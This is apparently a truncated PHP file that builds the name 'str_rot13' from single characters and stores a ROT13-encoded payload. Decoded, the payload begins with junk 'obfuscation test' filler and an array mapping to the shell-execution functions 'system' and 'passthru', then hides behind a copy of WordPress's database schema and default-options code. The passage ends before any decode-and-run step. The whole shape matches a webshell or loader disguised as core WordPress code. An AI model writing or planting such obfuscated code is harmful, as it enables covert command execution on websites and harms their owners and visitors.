<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * JbeqCerff Nqzvavfgengvba Fpurzr NCV
 *
 * Urer jr xrrc gur QO fgehpgher naq bcgvba inyhrf.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */

/**
 * Qrpyner gurfr nf tybony va pnfr fpurzn.cuc vf vapyhqrq sebz n shapgvba.
 *
 * @tybony jcqo   $jcqo            JbeqCerff qngnonfr nofgenpgvba bowrpg.
 * @tybony neenl  $jc_dhrevrf
 * @tybony fgevat $punefrg_pbyyngr
 */
tybony $jcqo, $jc_dhrevrf, $punefrg_pbyyngr;

/**
 * Gur qngnonfr punenpgre pbyyngr.
 */
$punefrg_pbyyngr = $jcqo->trg_punefrg_pbyyngr();

/**
 * Ergevrir gur FDY sbe perngvat qngnonfr gnoyrf.
 *
 * @fvapr 3.3.0
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz fgevat $fpbcr   Bcgvbany. Gur gnoyrf sbe juvpu gb ergevrir FDY. Pna or nyy, tybony, zf_tybony, be oybt gnoyrf. Qrsnhygf gb nyy.
 * @cnenz vag    $oybt_vq Bcgvbany. Gur fvgr VQ sbe juvpu gb ergevrir FDY. Qrsnhyg vf gur pheerag fvgr VQ.
 * @erghea fgevat Gur FDY arrqrq gb perngr gur erdhrfgrq gnoyrf.
 */
shapgvba jc_trg_qo_fpurzn( $fpbcr = 'nyy', $oybt_vq = ahyy ) {
	tybony $jcqo;

	$punefrg_pbyyngr = $jcqo->trg_punefrg_pbyyngr();

	vs ( $oybt_vq && (vag) $oybt_vq !== $jcqo->oybtvq ) {
		$byq_oybt_vq = $jcqo->frg_oybt_vq( $oybt_vq );
	}

	// Ratntr zhygvfvgr vs va gur zvqqyr bs gheavat vg ba sebz argjbex.cuc.
	$vf_zhygvfvgr = vf_zhygvfvgr() || ( qrsvarq( 'JC_VAFGNYYVAT_ARGJBEX' ) && JC_VAFGNYYVAT_ARGJBEX );

	/*
	 * Vaqrkrf unir n znkvzhz fvmr bs 767 olgrf. Uvfgbevpnyyl, jr unira'g arrq gb or pbaprearq nobhg gung.
	 * Nf bs 4.2, ubjrire, jr zbirq gb hgs8zo4, juvpu hfrf 4 olgrf cre punenpgre. Guvf zrnaf gung na vaqrk juvpu
	 * hfrq gb unir ebbz sbe sybbe(767/3) = 255 punenpgref, abj bayl unf ebbz sbe sybbe(767/4) = 191 punenpgref.
	 */
	$znk_vaqrk_yratgu = 191;

	// Oybt-fcrpvsvp gnoyrf.
	$oybt_gnoyrf = \"PERNGR GNOYR $jcqo->grezzrgn (
	zrgn_vq ovtvag(20) hafvtarq ABG AHYY nhgb_vaperzrag,
	grez_vq ovtvag(20) hafvtarq ABG AHYY qrsnhyg '0',
	zrgn_xrl inepune(255) qrsnhyg AHYY,
	zrgn_inyhr ybatgrkg,
	CEVZNEL XRL  (zrgn_vq),
	XRL grez_vq (grez_vq),
	XRL zrgn_xrl (zrgn_xrl($znk_vaqrk_yratgu))
) $punefrg_pbyyngr;
PERNGR GNOYR $jcqo->grezf (
 grez_vq ovtvag(20) hafvtarq ABG AHYY nhgb_vaperzrag,
 anzr inepune(200) ABG AHYY qrsnhyg '',
 fyht inepune(200) ABG AHYY qrsnhyg '',
 grez_tebhc ovtvag(10) ABG AHYY qrsnhyg 0,
 CEVZNEL XRL  (grez_vq),
 XRL fyht (fyht($znk_vaqrk_yratgu)),
 XRL anzr (anzr($znk_vaqrk_yratgu))
) $punefrg_pbyyngr;
PERNGR GNOYR $jcqo->grez_gnkbabzl (
 grez_gnkbabzl_vq ovtvag(20) hafvtarq ABG AHYY nhgb_vaperzrag,
 grez_vq ovtvag(20) hafvtarq ABG AHYY qrsnhyg 0,
 gnkbabzl inepune(32) ABG AHYY qrsnhyg '',
 qrfpevcgvba ybatgrkg ABG AHYY,
 cnerag ovtvag(20) hafvtarq ABG AHYY qrsnhyg 0,
 pbhag ovtvag(20) ABG AHYY qrsnhyg 0,
 CEVZNEL XRL  (grez_gnkbabzl_vq),
 HAVDHR XRL grez_vq_gnkbabzl (grez_vq,gnkbabzl),
 XRL gnkbabzl (gnkbabzl)
) $punefrg_pbyyngr;
PERNGR GNOYR $jcqo->grez_eryngvbafuvcf (
 bowrpg_vq ovtvag(20) hafvtarq ABG AHYY qrsnhyg 0,
 grez_gnkbabzl_vq ovtvag(20) hafvtarq ABG AHYY qrsnhyg 0,
 grez_beqre vag(11) ABG AHYY qrsnhyg 0,
 CEVZNEL XRL  (bowrpg_vq,grez_gnkbabzl_vq),
 XRL grez_gnkbabzl_vq (grez_gnkbabzl_vq)
) $punefrg_pbyyngr;
PERNGR GNOYR $jcqo->pbzzragzrgn (
	zrgn_vq ovtvag(20) hafvtarq ABG AHYY nhgb_vaperzrag,
	pbzzrag_vq ovtvag(20) hafvtarq ABG AHYY qrsnhyg '0',
	zrgn_xrl inepune(255) qrsnhyg AHYY,
	zrgn_inyhr ybatgrkg,
	CEVZNEL XRL  (zrgn_vq),
	XRL pbzzrag_vq (pbzzrag_vq),
	XRL zrgn_xrl (zrgn_xrl($znk_vaqrk_yratgu))
) $punefrg_pbyyngr;
PERNGR GNOYR $jcqo->pbzzragf (
	pbzzrag_VQ ovtvag(20) hafvtarq ABG AHYY nhgb_vaperzrag,
	pbzzrag_cbfg_VQ ovtvag(20) hafvtarq ABG AHYY qrsnhyg '0',
	pbzzrag_nhgube gvalgrkg ABG AHYY,
	pbzzrag_nhgube_rznvy inepune(100) ABG AHYY qrsnhyg '',
	pbzzrag_nhgube_hey inepune(200) ABG AHYY qrsnhyg '',
	pbzzrag_nhgube_VC inepune(100) ABG AHYY qrsnhyg '',
	pbzzrag_qngr qngrgvzr ABG AHYY qrsnhyg '0000-00-00 00:00:00',
	pbzzrag_qngr_tzg qngrgvzr ABG AHYY qrsnhyg '0000-00-00 00:00:00',
	pbzzrag_pbagrag grkg ABG AHYY,
	pbzzrag_xnezn vag(11) ABG AHYY qrsnhyg '0',
	pbzzrag_nccebirq inepune(20) ABG AHYY qrsnhyg '1',
	pbzzrag_ntrag inepune(255) ABG AHYY qrsnhyg '',
	pbzzrag_glcr inepune(20) ABG AHYY qrsnhyg 'pbzzrag',
	pbzzrag_cnerag ovtvag(20) hafvtarq ABG AHYY qrsnhyg '0',
	hfre_vq ovtvag(20) hafvtarq ABG AHYY qrsnhyg '0',
	CEVZNEL XRL  (pbzzrag_VQ),
	XRL pbzzrag_cbfg_VQ (pbzzrag_cbfg_VQ),
	XRL pbzzrag_nccebirq_qngr_tzg (pbzzrag_nccebirq,pbzzrag_qngr_tzg),
	XRL pbzzrag_qngr_tzg (pbzzrag_qngr_tzg),
	XRL pbzzrag_cnerag (pbzzrag_cnerag),
	XRL pbzzrag_nhgube_rznvy (pbzzrag_nhgube_rznvy(10))
) $punefrg_pbyyngr;
PERNGR GNOYR $jcqo->yvaxf (
	yvax_vq ovtvag(20) hafvtarq ABG AHYY nhgb_vaperzrag,
	yvax_hey inepune(255) ABG AHYY qrsnhyg '',
	yvax_anzr inepune(255) ABG AHYY qrsnhyg '',
	yvax_vzntr inepune(255) ABG AHYY qrsnhyg '',
	yvax_gnetrg inepune(25) ABG AHYY qrsnhyg '',
	yvax_qrfpevcgvba inepune(255) ABG AHYY qrsnhyg '',
	yvax_ivfvoyr inepune(20) ABG AHYY qrsnhyg 'L',
	yvax_bjare ovtvag(20) hafvtarq ABG AHYY qrsnhyg '1',
	yvax_engvat vag(11) ABG AHYY qrsnhyg '0',
	yvax_hcqngrq qngrgvzr ABG AHYY qrsnhyg '0000-00-00 00:00:00',
	yvax_ery inepune(255) ABG AHYY qrsnhyg '',
	yvax_abgrf zrqvhzgrkg ABG AHYY,
	yvax_eff inepune(255) ABG AHYY qrsnhyg '',
	CEVZNEL XRL  (yvax_vq),
	XRL yvax_ivfvoyr (yvax_ivfvoyr)
) $punefrg_pbyyngr;
PERNGR GNOYR $jcqo->bcgvbaf (
	bcgvba_vq ovtvag(20) hafvtarq ABG AHYY nhgb_vaperzrag,
	bcgvba_anzr inepune(191) ABG AHYY qrsnhyg '',
	bcgvba_inyhr ybatgrkg ABG AHYY,
	nhgbybnq inepune(20) ABG AHYY qrsnhyg 'lrf',
	CEVZNEL XRL  (bcgvba_vq),
	HAVDHR XRL bcgvba_anzr (bcgvba_anzr),
	XRL nhgbybnq (nhgbybnq)
) $punefrg_pbyyngr;
PERNGR GNOYR $jcqo->cbfgzrgn (
	zrgn_vq ovtvag(20) hafvtarq ABG AHYY nhgb_vaperzrag,
	cbfg_vq ovtvag(20) hafvtarq ABG AHYY qrsnhyg '0',
	zrgn_xrl inepune(255) qrsnhyg AHYY,
	zrgn_inyhr ybatgrkg,
	CEVZNEL XRL  (zrgn_vq),
	XRL cbfg_vq (cbfg_vq),
	XRL zrgn_xrl (zrgn_xrl($znk_vaqrk_yratgu))
) $punefrg_pbyyngr;
PERNGR GNOYR $jcqo->cbfgf (
	VQ ovtvag(20) hafvtarq ABG AHYY nhgb_vaperzrag,
	cbfg_nhgube ovtvag(20) hafvtarq ABG AHYY qrsnhyg '0',
	cbfg_qngr qngrgvzr ABG AHYY qrsnhyg '0000-00-00 00:00:00',
	cbfg_qngr_tzg qngrgvzr ABG AHYY qrsnhyg '0000-00-00 00:00:00',
	cbfg_pbagrag ybatgrkg ABG AHYY,
	cbfg_gvgyr grkg ABG AHYY,
	cbfg_rkprecg grkg ABG AHYY,
	cbfg_fgnghf inepune(20) ABG AHYY qrsnhyg 'choyvfu',
	pbzzrag_fgnghf inepune(20) ABG AHYY qrsnhyg 'bcra',
	cvat_fgnghf inepune(20) ABG AHYY qrsnhyg 'bcra',
	cbfg_cnffjbeq inepune(255) ABG AHYY qrsnhyg '',
	cbfg_anzr inepune(200) ABG AHYY qrsnhyg '',
	gb_cvat grkg ABG AHYY,
	cvatrq grkg ABG AHYY,
	cbfg_zbqvsvrq qngrgvzr ABG AHYY qrsnhyg '0000-00-00 00:00:00',
	cbfg_zbqvsvrq_tzg qngrgvzr ABG AHYY qrsnhyg '0000-00-00 00:00:00',
	cbfg_pbagrag_svygrerq ybatgrkg ABG AHYY,
	cbfg_cnerag ovtvag(20) hafvtarq ABG AHYY qrsnhyg '0',
	thvq inepune(255) ABG AHYY qrsnhyg '',
	zrah_beqre vag(11) ABG AHYY qrsnhyg '0',
	cbfg_glcr inepune(20) ABG AHYY qrsnhyg 'cbfg',
	cbfg_zvzr_glcr inepune(100) ABG AHYY qrsnhyg '',
	pbzzrag_pbhag ovtvag(20) ABG AHYY qrsnhyg '0',
	CEVZNEL XRL  (VQ),
	XRL cbfg_anzr (cbfg_anzr($znk_vaqrk_yratgu)),
	XRL glcr_fgnghf_qngr (cbfg_glcr,cbfg_fgnghf,cbfg_qngr,VQ),
	XRL cbfg_cnerag (cbfg_cnerag),
	XRL cbfg_nhgube (cbfg_nhgube)
) $punefrg_pbyyngr;\a\";

	// Fvatyr fvgr hfref gnoyr. Gur zhygvfvgr synibe bs gur hfref gnoyr vf unaqyrq orybj.
	$hfref_fvatyr_gnoyr = \"PERNGR GNOYR $jcqo->hfref (
	VQ ovtvag(20) hafvtarq ABG AHYY nhgb_vaperzrag,
	hfre_ybtva inepune(60) ABG AHYY qrsnhyg '',
	hfre_cnff inepune(255) ABG AHYY qrsnhyg '',
	hfre_avpranzr inepune(50) ABG AHYY qrsnhyg '',
	hfre_rznvy inepune(100) ABG AHYY qrsnhyg '',
	hfre_hey inepune(100) ABG AHYY qrsnhyg '',
	hfre_ertvfgrerq qngrgvzr ABG AHYY qrsnhyg '0000-00-00 00:00:00',
	hfre_npgvingvba_xrl inepune(255) ABG AHYY qrsnhyg '',
	hfre_fgnghf vag(11) ABG AHYY qrsnhyg '0',
	qvfcynl_anzr inepune(250) ABG AHYY qrsnhyg '',
	CEVZNEL XRL  (VQ),
	XRL hfre_ybtva_xrl (hfre_ybtva),
	XRL hfre_avpranzr (hfre_avpranzr),
	XRL hfre_rznvy (hfre_rznvy)
) $punefrg_pbyyngr;\a\";

	// Zhygvfvgr hfref gnoyr.
	$hfref_zhygv_gnoyr = \"PERNGR GNOYR $jcqo->hfref (
	VQ ovtvag(20) hafvtarq ABG AHYY nhgb_vaperzrag,
	hfre_ybtva inepune(60) ABG AHYY qrsnhyg '',
	hfre_cnff inepune(255) ABG AHYY qrsnhyg '',
	hfre_avpranzr inepune(50) ABG AHYY qrsnhyg '',
	hfre_rznvy inepune(100) ABG AHYY qrsnhyg '',
	hfre_hey inepune(100) ABG AHYY qrsnhyg '',
	hfre_ertvfgrerq qngrgvzr ABG AHYY qrsnhyg '0000-00-00 00:00:00',
	hfre_npgvingvba_xrl inepune(255) ABG AHYY qrsnhyg '',
	hfre_fgnghf vag(11) ABG AHYY qrsnhyg '0',
	qvfcynl_anzr inepune(250) ABG AHYY qrsnhyg '',
	fcnz gvalvag(2) ABG AHYY qrsnhyg '0',
	qryrgrq gvalvag(2) ABG AHYY qrsnhyg '0',
	CEVZNEL XRL  (VQ),
	XRL hfre_ybtva_xrl (hfre_ybtva),
	XRL hfre_avpranzr (hfre_avpranzr),
	XRL hfre_rznvy (hfre_rznvy)
) $punefrg_pbyyngr;\a\";

	// Hfrezrgn.
	$hfrezrgn_gnoyr = \"PERNGR GNOYR $jcqo->hfrezrgn (
	hzrgn_vq ovtvag(20) hafvtarq ABG AHYY nhgb_vaperzrag,
	hfre_vq ovtvag(20) hafvtarq ABG AHYY qrsnhyg '0',
	zrgn_xrl inepune(255) qrsnhyg AHYY,
	zrgn_inyhr ybatgrkg,
	CEVZNEL XRL  (hzrgn_vq),
	XRL hfre_vq (hfre_vq),
	XRL zrgn_xrl (zrgn_xrl($znk_vaqrk_yratgu))
) $punefrg_pbyyngr;\a\";

	// Tybony gnoyrf.
	vs ( $vf_zhygvfvgr ) {
		$tybony_gnoyrf = $hfref_zhygv_gnoyr . $hfrezrgn_gnoyr;
	} ryfr {
		$tybony_gnoyrf = $hfref_fvatyr_gnoyr . $hfrezrgn_gnoyr;
	}

	// Zhygvfvgr tybony gnoyrf.
	$zf_tybony_gnoyrf = \"PERNGR GNOYR $jcqo->oybtf (
	oybt_vq ovtvag(20) ABG AHYY nhgb_vaperzrag,
	fvgr_vq ovtvag(20) ABG AHYY qrsnhyg '0',
	qbznva inepune(200) ABG AHYY qrsnhyg '',
	cngu inepune(100) ABG AHYY qrsnhyg '',
	ertvfgrerq qngrgvzr ABG AHYY qrsnhyg '0000-00-00 00:00:00',
	ynfg_hcqngrq qngrgvzr ABG AHYY qrsnhyg '0000-00-00 00:00:00',
	choyvp gvalvag(2) ABG AHYY qrsnhyg '1',
	nepuvirq gvalvag(2) ABG AHYY qrsnhyg '0',
	zngher gvalvag(2) ABG AHYY qrsnhyg '0',
	fcnz gvalvag(2) ABG AHYY qrsnhyg '0',
	qryrgrq gvalvag(2) ABG AHYY qrsnhyg '0',
	ynat_vq vag(11) ABG AHYY qrsnhyg '0',
	CEVZNEL XRL  (oybt_vq),
	XRL qbznva (qbznva(50),cngu(5)),
	XRL ynat_vq (ynat_vq)
) $punefrg_pbyyngr;
PERNGR GNOYR $jcqo->oybtzrgn (
	zrgn_vq ovtvag(20) hafvtarq ABG AHYY nhgb_vaperzrag,
	oybt_vq ovtvag(20) ABG AHYY qrsnhyg '0',
	zrgn_xrl inepune(255) qrsnhyg AHYY,
	zrgn_inyhr ybatgrkg,
	CEVZNEL XRL  (zrgn_vq),
	XRL zrgn_xrl (zrgn_xrl($znk_vaqrk_yratgu)),
	XRL oybt_vq (oybt_vq)
) $punefrg_pbyyngr;
PERNGR GNOYR $jcqo->ertvfgengvba_ybt (
	VQ ovtvag(20) ABG AHYY nhgb_vaperzrag,
	rznvy inepune(255) ABG AHYY qrsnhyg '',
	VC inepune(30) ABG AHYY qrsnhyg '',
	oybt_vq ovtvag(20) ABG AHYY qrsnhyg '0',
	qngr_ertvfgrerq qngrgvzr ABG AHYY qrsnhyg '0000-00-00 00:00:00',
	CEVZNEL XRL  (VQ),
	XRL VC (VC)
) $punefrg_pbyyngr;
PERNGR GNOYR $jcqo->fvgr (
	vq ovtvag(20) ABG AHYY nhgb_vaperzrag,
	qbznva inepune(200) ABG AHYY qrsnhyg '',
	cngu inepune(100) ABG AHYY qrsnhyg '',
	CEVZNEL XRL  (vq),
	XRL qbznva (qbznva(140),cngu(51))
) $punefrg_pbyyngr;
PERNGR GNOYR $jcqo->fvgrzrgn (
	zrgn_vq ovtvag(20) ABG AHYY nhgb_vaperzrag,
	fvgr_vq ovtvag(20) ABG AHYY qrsnhyg '0',
	zrgn_xrl inepune(255) qrsnhyg AHYY,
	zrgn_inyhr ybatgrkg,
	CEVZNEL XRL  (zrgn_vq),
	XRL zrgn_xrl (zrgn_xrl($znk_vaqrk_yratgu)),
	XRL fvgr_vq (fvgr_vq)
) $punefrg_pbyyngr;
PERNGR GNOYR $jcqo->fvtahcf (
	fvtahc_vq ovtvag(20) ABG AHYY nhgb_vaperzrag,
	qbznva inepune(200) ABG AHYY qrsnhyg '',
	cngu inepune(100) ABG AHYY qrsnhyg '',
	gvgyr ybatgrkg ABG AHYY,
	hfre_ybtva inepune(60) ABG AHYY qrsnhyg '',
	hfre_rznvy inepune(100) ABG AHYY qrsnhyg '',
	ertvfgrerq qngrgvzr ABG AHYY qrsnhyg '0000-00-00 00:00:00',
	npgvingrq qngrgvzr ABG AHYY qrsnhyg '0000-00-00 00:00:00',
	npgvir gvalvag(1) ABG AHYY qrsnhyg '0',
	npgvingvba_xrl inepune(50) ABG AHYY qrsnhyg '',
	zrgn ybatgrkg,
	CEVZNEL XRL  (fvtahc_vq),
	XRL npgvingvba_xrl (npgvingvba_xrl),
	XRL hfre_rznvy (hfre_rznvy),
	XRL hfre_ybtva_rznvy (hfre_ybtva,hfre_rznvy),
	XRL qbznva_cngu (qbznva(140),cngu(51))
) $punefrg_pbyyngr;\";

	fjvgpu ( $fpbcr ) {
		pnfr 'oybt':
			$dhrevrf = $oybt_gnoyrf;
			oernx;
		pnfr 'tybony':
			$dhrevrf = $tybony_gnoyrf;
			vs ( $vf_zhygvfvgr ) {
				$dhrevrf .= $zf_tybony_gnoyrf;
			}
			oernx;
		pnfr 'zf_tybony':
			$dhrevrf = $zf_tybony_gnoyrf;
			oernx;
		pnfr 'nyy':
		qrsnhyg:
			$dhrevrf = $tybony_gnoyrf . $oybt_gnoyrf;
			vs ( $vf_zhygvfvgr ) {
				$dhrevrf .= $zf_tybony_gnoyrf;
			}
			oernx;
	}

	vs ( vffrg( $byq_oybt_vq ) ) {
		$jcqo->frg_oybt_vq( $byq_oybt_vq );
	}

	erghea $dhrevrf;
}

// Cbchyngr sbe onpx pbzcng.
$jc_dhrevrf = jc_trg_qo_fpurzn( 'nyy' );

/**
 * Perngr JbeqCerff bcgvbaf naq frg gur qrsnhyg inyhrf.
 *
 * @fvapr 1.5.0
 * @fvapr 5.1.0 Gur $bcgvbaf cnenzrgre unf orra nqqrq.
 *
 * @tybony jcqo $jcqo                  JbeqCerff qngnonfr nofgenpgvba bowrpg.
 * @tybony vag  $jc_qo_irefvba         JbeqCerff qngnonfr irefvba.
 * @tybony vag  $jc_pheerag_qo_irefvba Gur byq (pheerag) qngnonfr irefvba.
 *
 * @cnenz neenl $bcgvbaf Bcgvbany. Phfgbz bcgvba $xrl => $inyhr cnvef gb hfr. Qrsnhyg rzcgl neenl.
 */
shapgvba cbchyngr_bcgvbaf( neenl $bcgvbaf = neenl() ) {
	tybony $jcqo, $jc_qo_irefvba, $jc_pheerag_qo_irefvba;

	$thrffhey = jc_thrff_hey();
	/**
	 * Sverf orsber perngvat JbeqCerff bcgvbaf naq cbchyngvat gurve qrsnhyg inyhrf.
	 *
	 * @fvapr 2.6.0
	 */
	qb_npgvba( 'cbchyngr_bcgvbaf' );

	// Vs JC_QRSNHYG_GURZR qbrfa'g rkvfg, snyy onpx gb gur yngrfg pber qrsnhyg gurzr.
	$fglyrfurrg = JC_QRSNHYG_GURZR;
	$grzcyngr   = JC_QRSNHYG_GURZR;
	$gurzr      = jc_trg_gurzr( JC_QRSNHYG_GURZR );
	vs ( ! $gurzr->rkvfgf() ) {
		$gurzr = JC_Gurzr::trg_pber_qrsnhyg_gurzr();
	}

	// Vs jr pna'g svaq n pber qrsnhyg gurzr, JC_QRSNHYG_GURZR vf gur orfg jr pna qb.
	vs ( $gurzr ) {
		$fglyrfurrg = $gurzr->trg_fglyrfurrg();
		$grzcyngr   = $gurzr->trg_grzcyngr();
	}

	$gvzrmbar_fgevat = '';
	$tzg_bssfrg      = 0;
	/*
	 * genafyngbef: qrsnhyg TZG bssfrg be gvzrmbar fgevat. Zhfg or rvgure n inyvq bssfrg (-12 gb 14)
	 * be n inyvq gvzrmbar fgevat (Nzrevpn/Arj_Lbex). Frr uggcf://jjj.cuc.arg/znahny/ra/gvzrmbarf.cuc
	 * sbe nyy gvzrmbar fgevatf pheeragyl fhccbegrq ol CUC.
	 *
	 * Vzcbegnag: Jura n cerivbhf gvzrmbar fgevat, yvxr `Rhebcr/Xvri`, unf orra fhcrefrqrq ol na
	 * hcqngrq bar, yvxr `Rhebcr/Xlvi`, nf n ehyr bs guhzo, gur **byq** gvzrmbar anzr fubhyq or hfrq
	 * va gur \"genafyngvba\" gb nyybj sbe gur qrsnhyg gvzrmbar frggvat gb or CUC pebff-irefvba pbzcngvoyr,
	 * nf byq gvzrmbar anzrf jvyy or erpbtavmrq va arj CUC irefvbaf, juvyr arj gvzrmbar anzrf pnaabg
	 * or erpbtavmrq va byq CUC irefvbaf.
	 *
	 * Gb irevsl juvpu gvzrmbar fgevatf ner ninvynoyr va gur _byqrfg_ CUC irefvba fhccbegrq, lbh pna
	 * hfr uggcf://3i4y.bet/6LDNg#i5.6.20 naq ercynpr gur \"OE\" (Oenmvy) va gur pbqr yvar jvgu gur
	 * pbhagel pbqr sbe juvpu lbh jnag gb ybbx hc gur fhccbegrq gvzrmbar anzrf.
	 */
	$bssfrg_be_gm = _k( '0', 'qrsnhyg TZG bssfrg be gvzrmbar fgevat' );
	vs ( vf_ahzrevp( $bssfrg_be_gm ) ) {
		$tzg_bssfrg = $bssfrg_be_gm;
	} ryfrvs ( $bssfrg_be_gm && va_neenl( $bssfrg_be_gm, gvzrmbar_vqragvsvref_yvfg( QngrGvzrMbar::NYY_JVGU_OP ), gehr ) ) {
		$gvzrmbar_fgevat = $bssfrg_be_gm;
	}

	$qrsnhygf = neenl(
		'fvgrhey'                         => $thrffhey,
		'ubzr'                            => $thrffhey,
		'oybtanzr'                        => __( 'Zl Fvgr' ),
		'oybtqrfpevcgvba'                 => '',
		'hfref_pna_ertvfgre'              => 0,
		'nqzva_rznvy'                     => 'lbh@rknzcyr.pbz',
		/* genafyngbef: Qrsnhyg fgneg bs gur jrrx. 0 = Fhaqnl, 1 = Zbaqnl. */
		'fgneg_bs_jrrx'                   => _k( '1', 'fgneg bs jrrx' ),
		'hfr_onynaprGntf'                 => 0,
		'hfr_fzvyvrf'                     => 1,
		'erdhver_anzr_rznvy'              => 1,
		'pbzzragf_abgvsl'                 => 1,
		'cbfgf_cre_eff'                   => 10,
		'eff_hfr_rkprecg'                 => 0,
		'znvyfreire_hey'                  => 'znvy.rknzcyr.pbz',
		'znvyfreire_ybtva'                => 'ybtva@rknzcyr.pbz',
		'znvyfreire_cnff'                 => '',
		'znvyfreire_cbeg'                 => 110,
		'qrsnhyg_pngrtbel'                => 1,
		'qrsnhyg_pbzzrag_fgnghf'          => 'bcra',
		'qrsnhyg_cvat_fgnghf'             => 'bcra',
		'qrsnhyg_cvatonpx_synt'           => 1,
		'cbfgf_cre_cntr'                  => 10,
		/* genafyngbef: Qrsnhyg qngr sbezng, frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
		'qngr_sbezng'                     => __( 'S w, L' ),
		/* genafyngbef: Qrsnhyg gvzr sbezng, frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
		'gvzr_sbezng'                     => __( 't:v n' ),
		/* genafyngbef: Yvaxf ynfg hcqngrq qngr sbezng, frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
		'yvaxf_hcqngrq_qngr_sbezng'       => __( 'S w, L t:v n' ),
		'pbzzrag_zbqrengvba'              => 0,
		'zbqrengvba_abgvsl'               => 1,
		'creznyvax_fgehpgher'             => '',
		'erjevgr_ehyrf'                   => '',
		'unpx_svyr'                       => 0,
		'oybt_punefrg'                    => 'HGS-8',
		'zbqrengvba_xrlf'                 => '',
		'npgvir_cyhtvaf'                  => neenl(),
		'pngrtbel_onfr'                   => '',
		'cvat_fvgrf'                      => 'uggc://ecp.cvatbzngvp.pbz/',
		'pbzzrag_znk_yvaxf'               => 2,
		'tzg_bssfrg'                      => $tzg_bssfrg,

		// 1.5.0
		'qrsnhyg_rznvy_pngrtbel'          => 1,
		'erpragyl_rqvgrq'                 => '',
		'grzcyngr'                        => $grzcyngr,
		'fglyrfurrg'                      => $fglyrfurrg,
		'pbzzrag_ertvfgengvba'            => 0,
		'ugzy_glcr'                       => 'grkg/ugzy',

		// 1.5.1
		'hfr_genpxonpx'                   => 0,

		// 2.0.0
		'qrsnhyg_ebyr'                    => 'fhofpevore',
		'qo_irefvba'                      => $jc_qo_irefvba,

		// 2.0.1
		'hcybnqf_hfr_lrnezbagu_sbyqref'   => 1,
		'hcybnq_cngu'                     => '',

		// 2.1.0
		'oybt_choyvp'                     => '1',
		'qrsnhyg_yvax_pngrtbel'           => 2,
		'fubj_ba_sebag'                   => 'cbfgf',

		// 2.2.0
		'gnt_onfr'                        => '',

		// 2.5.0
		'fubj_ningnef'                    => '1',
		'ningne_engvat'                   => 'T',
		'hcybnq_hey_cngu'                 => '',
		'guhzoanvy_fvmr_j'                => 150,
		'guhzoanvy_fvmr_u'                => 150,
		'guhzoanvy_pebc'                  => 1,
		'zrqvhz_fvmr_j'                   => 300,
		'zrqvhz_fvmr_u'                   => 300,

		// 2.6.0
		'ningne_qrsnhyg'                  => 'zlfgrel',

		// 2.7.0
		'ynetr_fvmr_j'                    => 1024,
		'ynetr_fvmr_u'                    => 1024,
		'vzntr_qrsnhyg_yvax_glcr'         => 'abar',
		'vzntr_qrsnhyg_fvmr'              => '',
		'vzntr_qrsnhyg_nyvta'             => '',
		'pybfr_pbzzragf_sbe_byq_cbfgf'    => 0,
		'pybfr_pbzzragf_qnlf_byq'         => 14,
		'guernq_pbzzragf'                 => 1,
		'guernq_pbzzragf_qrcgu'           => 5,
		'cntr_pbzzragf'                   => 0,
		'pbzzragf_cre_cntr'               => 50,
		'qrsnhyg_pbzzragf_cntr'           => 'arjrfg',
		'pbzzrag_beqre'                   => 'nfp',
		'fgvpxl_cbfgf'                    => neenl(),
		'jvqtrg_pngrtbevrf'               => neenl(),
		'jvqtrg_grkg'                     => neenl(),
		'jvqtrg_eff'                      => neenl(),
		'havafgnyy_cyhtvaf'               => neenl(),

		// 2.8.0
		'gvzrmbar_fgevat'                 => $gvzrmbar_fgevat,

		// 3.0.0
		'cntr_sbe_cbfgf'                  => 0,
		'cntr_ba_sebag'                   => 0,

		// 3.1.0
		'qrsnhyg_cbfg_sbezng'             => 0,

		// 3.5.0
		'yvax_znantre_ranoyrq'            => 0,

		// 4.3.0
		'svavfurq_fcyvggvat_funerq_grezf' => 1,
		'fvgr_vpba'                       => 0,

		// 4.4.0
		'zrqvhz_ynetr_fvmr_j'             => 768,
		'zrqvhz_ynetr_fvmr_u'             => 0,

		// 4.9.6
		'jc_cntr_sbe_cevinpl_cbyvpl'      => 0,

		// 4.9.8
		'fubj_pbzzragf_pbbxvrf_bcg_va'    => 1,

		// 5.3.0
		'nqzva_rznvy_yvsrfcna'            => ( gvzr() + 6 * ZBAGU_VA_FRPBAQF ),

		// 5.5.0
		'qvfnyybjrq_xrlf'                 => '',
		'pbzzrag_cerivbhfyl_nccebirq'     => 1,
		'nhgb_cyhtva_gurzr_hcqngr_rznvyf' => neenl(),

		// 5.6.0
		'nhgb_hcqngr_pber_qri'            => 'ranoyrq',
		'nhgb_hcqngr_pber_zvabe'          => 'ranoyrq',
		/*
		 * Qrsnhyg gb ranoyrq sbe arj vafgnyyf.
		 * Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/51742.
		 */
		'nhgb_hcqngr_pber_znwbe'          => 'ranoyrq',

		// 5.8.0
		'jc_sbepr_qrnpgvingrq_cyhtvaf'    => neenl(),

		// 6.4.0
		'jc_nggnpuzrag_cntrf_ranoyrq'     => 0,
	);

	// 3.3.0
	vs ( ! vf_zhygvfvgr() ) {
		$qrsnhygf['vavgvny_qo_irefvba'] = ! rzcgl( $jc_pheerag_qo_irefvba ) && $jc_pheerag_qo_irefvba < $jc_qo_irefvba
			? $jc_pheerag_qo_irefvba : $jc_qo_irefvba;
	}

	// 3.0.0 zhygvfvgr.
	vs ( vf_zhygvfvgr() ) {
		$qrsnhygf['creznyvax_fgehpgher'] = '/%lrne%/%zbaguahz%/%qnl%/%cbfganzr%/';
	}

	$bcgvbaf = jc_cnefr_netf( $bcgvbaf, $qrsnhygf );

